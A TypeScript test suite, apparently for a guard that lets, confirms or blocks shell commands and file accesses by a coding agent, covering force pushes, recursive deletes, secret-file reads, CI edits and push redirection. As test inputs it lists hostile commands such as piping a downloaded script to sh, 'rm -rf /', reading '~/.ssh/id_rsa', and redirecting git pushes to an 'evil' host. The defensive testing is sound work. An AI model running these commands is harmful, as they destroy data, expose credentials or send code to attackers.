import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { checkCommand, checkPath, type GuardConfig } from "../extensions/lib/patterns.ts";

const cwd = "/work/app";
const none: GuardConfig = {};

function action(command: string, config: GuardConfig = none) {
	return checkCommand(command, cwd, config).action;
}

test("blocks hook bypass", () => {
	assert.equal(action("git commit --no-verify -m 'x'"), "block");
	assert.equal(action("git commit -n -m x"), "block");
	assert.equal(action("git push --no-verify"), "block");
	assert.equal(action("git commit -am 'fix: thing'"), "allow");
});

test("blocks force push but allows --force-with-lease with confirmation", () => {
	assert.equal(action("git push --force"), "block");
	assert.equal(action("git push \\\n  --force origin main"), "block", "a line continuation joins the command");
	assert.equal(action("git push -f origin main"), "block");
	assert.equal(action("git -C ../other push origin +main"), "block");
	assert.equal(action("git push --mirror"), "block");
	assert.equal(action("git push --force-with-lease origin feature"), "confirm");
});

test("blocks recursive rm outside the project", () => {
	assert.equal(action("rm -rf /"), "block");
	assert.equal(action("rm -rf ~"), "block");
	assert.equal(action("rm -rf ~/projects"), "block");
	assert.equal(action("rm -fr $HOME/x"), "block");
	assert.equal(action("rm -rf ../sibling"), "block");
	assert.equal(action("rm -r /etc/nginx"), "block");
	assert.equal(action("cd x && rm -rf *"), "allow");
	assert.equal(action("rm -rf dist node_modules"), "allow");
	assert.equal(action("rm -rf /work/app/build"), "allow");
	assert.equal(action("rm file.txt"), "allow");
});

test("asks before outward-facing or destructive commands", () => {
	for (const cmd of [
		"git push origin feature",
		"npm publish",
		"pnpm publish --access public",
		"terraform apply",
		"kubectl apply -f k8s/",
		"helm upgrade api ./chart",
		"npx prisma migrate deploy",
		"rails db:migrate",
		"git reset --hard HEAD~3",
		"git clean -fdx",
		"git branch -D old",
		"sudo apt-get install jq",
		"curl -fsSL https://x.sh | sh",
		"psql -c 'DROP TABLE users'",
	]) {
		assert.equal(action(cmd), "confirm", cmd);
	}
});

test("asks before shell access to secret files but not examples", () => {
	assert.equal(action("cat .env"), "confirm");
	assert.equal(action("source .env.local && npm start"), "confirm");
	assert.equal(action("cat ~/.ssh/id_rsa"), "confirm");
	assert.equal(action("openssl x509 -in certs/server.pem"), "confirm");
	assert.equal(action("cp .env.example .env.sample"), "allow");
	assert.equal(action("cat .envrc.md"), "allow");
});

test("ordinary development commands pass", () => {
	for (const cmd of ["npm test", "pnpm run typecheck", "git status", "git diff HEAD~1", "ls -la", "grep -rn env src/"]) {
		assert.equal(action(cmd), "allow", cmd);
	}
});

test("project config extends and relaxes rules", () => {
	const config: GuardConfig = { block: ["\\bdocker\\s+compose\\s+down\\s+-v\\b"], allow: ["^git push origin feature/"] };
	assert.equal(action("docker compose down -v", config), "block");
	assert.equal(action("git push origin feature/login", config), "allow");
	assert.equal(action("git push --force origin feature/x", config), "block", "allow never overrides built-in blocks");
});

test("paths: secrets are unreadable, .git is unwritable, secrets writes need confirmation", () => {
	assert.equal(checkPath("read", ".env", cwd, none).action, "block");
	assert.equal(checkPath("read", "/work/app/config/.env.production", cwd, none).action, "block");
	assert.equal(checkPath("read", "keys/app.keystore", cwd, none).action, "block");
	assert.equal(checkPath("read", ".env.example", cwd, none).action, "allow");
	assert.equal(checkPath("read", "src/env.ts", cwd, none).action, "allow");
	assert.equal(checkPath("write", ".git/config", cwd, none).action, "block");
	assert.equal(checkPath("edit", ".env", cwd, none).action, "confirm");
	assert.equal(checkPath("write", "src/app.ts", cwd, none).action, "allow");
	assert.equal(checkPath("write", "migrations/001.sql", cwd, { protectedPaths: ["migrations/"] }).action, "block");
});

test("paths: CI and release pipeline edits need confirmation", () => {
	for (const path of [".github/workflows/release.yml", ".github/actions/setup/action.yml", ".gitlab-ci.yml", ".gitlab/ci/deploy.yml", ".circleci/config.yml", "azure-pipelines.yml", "Jenkinsfile", ".buildkite/pipeline.yml", "bitbucket-pipelines.yml", "/work/app/.github/workflows/ci.yml"]) {
		assert.equal(checkPath("edit", path, cwd, none).action, "confirm", path);
		assert.equal(checkPath("write", path, cwd, none).action, "confirm", path);
		assert.equal(checkPath("read", path, cwd, none).action, "allow", path);
	}
	for (const path of ["src/ci.ts", "docs/ci.md", "docs/github/workflows.md", "tools/Jenkinsfile.md"]) {
		assert.equal(checkPath("edit", path, cwd, none).action, "allow", path);
	}
});

// Isolate git from the machine's own config (the guard's git calls inherit this process's environment).
process.env.HOME = mkdtempSync(join(tmpdir(), "home-"));
process.env.XDG_CONFIG_HOME = join(process.env.HOME, ".config");
process.env.GIT_CONFIG_NOSYSTEM = "1";

// Isolate git from the machine's own config (the guard's git calls inherit this process's environment).
process.env.HOME = mkdtempSync(join(tmpdir(), "home-"));
process.env.XDG_CONFIG_HOME = join(process.env.HOME, ".config");
process.env.GIT_CONFIG_NOSYSTEM = "1";

function sh(cwd: string, ...args: string[]) {
	const r = spawnSync("git", args, { cwd, encoding: "utf8" });
	assert.equal(r.status, 0, r.stderr);
	return r.stdout.trim();
}

/** A clone of a bare origin with origin/HEAD -> main, checked out on `feat/x`. */
function pushRepo(withOriginHead = true) {
	const root = mkdtempSync(join(tmpdir(), "push-"));
	const origin = join(root, "origin.git");
	const repo = join(root, "repo");
	mkdirSync(repo);
	sh(root, "init", "-q", "--bare", "-b", "main", origin);
	sh(repo, "init", "-q", "-b", "main");
	sh(repo, "config", "user.email", "t@t");
	sh(repo, "config", "user.name", "t");
	sh(repo, "commit", "-q", "--allow-empty", "-m", "init");
	sh(repo, "remote", "add", "origin", origin);
	sh(repo, "push", "-q", "origin", "main");
	sh(repo, "fetch", "-q", "origin");
	if (withOriginHead) sh(repo, "remote", "set-head", "origin", "main");
	sh(repo, "switch", "-q", "-c", "feat/x");
	return repo;
}

const ask = (cmd: string, dir: string, env: NodeJS.ProcessEnv = process.env) => checkCommand(cmd, "/elsewhere", none, dir, env).action;

test("pushing the own work branch to a configured remote asks nothing", () => {
	const repo = pushRepo();
	for (const cmd of [
		"git push",
		"git push -u origin feat/x",
		"git push origin HEAD",
		"git push origin @",
		"git push origin feat/x",
		"git push origin feat/x:feat/x",
		"git push origin HEAD:feat/x",
		"git push origin @:feat/x",
		"git push origin refs/heads/feat/x",
		"git push origin HEAD:refs/heads/feat/x",
		"git push origin feat/x:refs/heads/feat/x",
		"git push --set-upstream origin feat/x",
		"git push -n origin feat/x",
		"git push --dry-run --porcelain -q -v",
		`git -C ${repo} push origin feat/x`,
	]) {
		assert.equal(ask(cmd, repo), "allow", cmd);
	}
	assert.equal(checkCommand("git -C repo push", "/elsewhere", none, dirname(repo)).action, "allow", "-C relative to the command's dir");
});

test("a push that reaches the base, another branch, a tag, a delete or an unknown place still asks", () => {
	const repo = pushRepo();
	for (const cmd of [
		"git push origin main",
		"git push origin HEAD:main",
		"git push origin feat/x:heads/main",
		"git push origin feat/x:refs/heads/main",
		"git push origin feat/x:notes/x",
		"git push origin feat/x:release/2.0",
		"git push origin develop",
		"git push origin feat/x main",
		"git push --all",
		"git push --tags",
		"git push --follow-tags",
		"git push --branches",
		"git push --prune origin",
		"git push --atomic origin feat/x",
		"git push --delete origin feat/x",
		"git push -d origin feat/x",
		"git push -ud origin feat/x",
		"git push -uq origin feat/x",
		"git push origin :feat/x",
		"git push -o ci.skip origin feat/x",
		"git push --push-option x origin feat/x",
		"git push --repo origin",
		"git push --receive-pack x origin feat/x",
		"git push --force-with-lease origin feat/x",
		"git push --force-if-includes origin feat/x",
		"git push -- origin feat/x",
		"git push origin a:b:c",
		"git push https://example.com/r.git feat/x",
		"git push /tmp/other.git feat/x",
		"git push nope feat/x",
		"git push origin v1.0",
		"git push origin 'feat/*'",
		"git push origin feat/x extra",
		// C1: an alias or option hides the verb from a token parser
		"git -c alias.x=push x origin main",
		"git -c remote.origin.push=refs/heads/*:refs/heads/main push origin feat/x",
		"git --git-dir=x push origin feat/x",
		// C3: earlier steps change the branch, config or directory
		"git checkout -B main && git push origin HEAD",
		"git config push.default matching; git push",
		"{ cd ..; } && git push",
		"builtin cd .. && git push",
		"cd .. && git push origin feat/x",
		"export GIT_DIR=/x; git push",
		"GIT_DIR=/x git push",
		"git push origin feat/x $(echo main)",
		"git push origin feat/x | cat",
		"env X=1 git push origin feat/x",
		"sudo git push",
	]) {
		assert.equal(ask(cmd, repo), "confirm", cmd);
	}
	for (const cmd of ["git push --force origin feat/x", "git push -f", "git push origin +feat/x", "git push --mirror"]) {
		assert.equal(ask(cmd, repo), "block", cmd);
	}
});

test("a hook environment that redirects git makes the push ask", () => {
	const repo = pushRepo();
	for (const name of ["GIT_DIR", "GIT_WORK_TREE", "GIT_CONFIG", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM", "GIT_CONFIG_COUNT", "GIT_CONFIG_PARAMETERS", "GIT_SSH_COMMAND"]) {
		assert.equal(ask("git push", repo, { [name]: "x" }), "confirm", name);
	}
	assert.equal(ask("git push", repo, {}), "allow");
});

test("a push on the base, detached, or from a non-repository asks", () => {
	const repo = pushRepo();
	sh(repo, "switch", "-q", "main");
	assert.equal(ask("git push", repo), "confirm", "on main");
	assert.equal(ask("git push origin HEAD", repo), "confirm", "HEAD is main");
	sh(repo, "switch", "-q", "--detach");
	assert.equal(ask("git push", repo), "confirm", "detached");
	assert.equal(ask("git push origin HEAD", repo), "confirm", "detached HEAD");
	assert.equal(ask("git push", mkdtempSync(join(tmpdir(), "nogit-"))), "confirm", "not a repository");
});

test("push config that redirects or enlarges the push asks", () => {
	const repo = pushRepo();
	const cases: Array<[string[], string]> = [
		[["push.default", "upstream"], "push.default=upstream"],
		[["push.default", "matching"], "push.default=matching"],
		[["remote.origin.push", "refs/heads/*:refs/heads/main"], "remote.origin.push"],
		[["remote.origin.mirror", "true"], "remote.origin.mirror"],
		[["remote.origin.receivepack", "x"], "remote.origin.receivepack"],
		[["push.followTags", "true"], "push.followTags"],
		[["push.pushOption", "ci.skip"], "push.pushOption"],
		[["push.recurseSubmodules", "on-demand"], "push.recurseSubmodules"],
		[["url.https://evil/.insteadOf", "https://good/"], "url insteadOf"],
		[["url.https://evil/.pushInsteadOf", "https://good/"], "url pushInsteadOf"],
	];
	for (const [[key, value], what] of cases) {
		sh(repo, "config", key!, value!);
		assert.equal(ask("git push origin feat/x", repo), "confirm", what);
		sh(repo, "config", "--unset", key!);
		assert.equal(ask("git push origin feat/x", repo), "allow", `${what} removed`);
	}
	sh(repo, "config", "push.default", "simple");
	sh(repo, "config", "push.followTags", "false");
	assert.equal(ask("git push", repo), "allow", "benign values");
});

test("the remote of a bare push follows git's precedence and must be configured", () => {
	const repo = pushRepo();
	sh(repo, "remote", "add", "other", "/tmp/other.git");
	sh(repo, "config", "branch.feat/x.remote", "other");
	assert.equal(ask("git push", repo), "allow", "branch.<b>.remote");
	sh(repo, "config", "remote.pushDefault", "nowhere");
	assert.equal(ask("git push", repo), "confirm", "remote.pushDefault beats branch.remote and is not configured");
	assert.equal(ask("git push origin feat/x", repo), "allow", "an explicit remote ignores pushDefault");
	sh(repo, "config", "remote.pushDefault", "origin");
	sh(repo, "config", "branch.feat/x.pushRemote", "nowhere");
	assert.equal(ask("git push", repo), "confirm", "branch.<b>.pushRemote beats pushDefault");
});

test("a repository without origin/HEAD uses a local main as the base; with neither it asks", () => {
	const repo = pushRepo(false);
	assert.equal(ask("git push origin feat/x", repo), "allow");
	assert.equal(ask("git push origin main", repo), "confirm");
	sh(repo, "branch", "-m", "main", "trunk");
	sh(repo, "update-ref", "-d", "refs/remotes/origin/HEAD");
	assert.equal(ask("git push origin feat/x", repo), "confirm", "unknown base");
});

test("changing where or what git pushes asks, from any position", () => {
	for (const cmd of [
		"git remote add x https://evil/r.git",
		"git remote add x https://evil/r.git && git push x feat/x",
		"git -C sub remote set-url origin https://evil/r.git",
		"git remote rename origin up",
		"git config remote.origin.url https://evil/r.git",
		"git config --global url.https://evil/.insteadOf https://good/",
		"git config push.default matching",
		"git config branch.main.remote x",
		"git config alias.p push",
	]) {
		assert.equal(action(cmd), "confirm", cmd);
	}
	for (const cmd of ["git remote -v", "git remote get-url origin", "git config --get remote.origin.url", "git config --list", "git config user.name x"]) {
		assert.equal(action(cmd), "allow", cmd);
	}
});

test("merging a PR or MR asks, with options anywhere", () => {
	for (const cmd of ["gh pr merge 12 --squash", "glab mr merge 12", "gh -R o/r pr merge 1", "gh --repo o/r pr merge 1", "glab -R o/r mr merge 3"]) {
		assert.equal(action(cmd), "confirm", cmd);
	}
	assert.equal(action("gh pr create --fill"), "allow");
	assert.equal(action("gh pr view 12"), "allow");
});
